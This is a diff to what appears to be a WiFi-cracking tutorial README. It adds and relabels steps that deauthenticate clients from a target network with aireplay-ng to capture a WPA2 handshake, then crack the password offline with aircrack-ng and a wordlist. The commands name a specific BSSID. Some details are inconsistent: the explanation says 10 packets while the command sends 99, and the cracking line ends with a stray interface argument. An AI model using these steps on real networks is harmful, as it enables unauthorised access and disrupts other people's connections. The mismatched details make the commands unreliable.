@@ -183,7 +183,7 @@ A wireless Adapter that supports monitor mode and packet injection
    * -w : The Directory where you want to save the file(Password File).
    * wlan0 : Name of the interface.
 
-10. Deauthorize client from wifi network
+10. Deauthorize client from wifi network (to capture WPA2 handshake)
     ```sh
     sudo aireplay-ng -0 99 -a CC:E1:D5:30:51:F8 wlan0
     ```
@@ -192,6 +192,11 @@ A wireless Adapter that supports monitor mode and packet injection
     * 10 : No. of deauthentication packets to be sent
     * -a : For the bssid of the target network
     * wlan0 : Name of the interface. 
+
+11. Run offline cracking sequence
+   ```sh
+   sudo aircrack-ng -a2 -b CC:E1:D5:30:51:F8 ./misc/passwords ./misc/hack-01.cap wlan0
+   ```
 
 # Demo #2
 
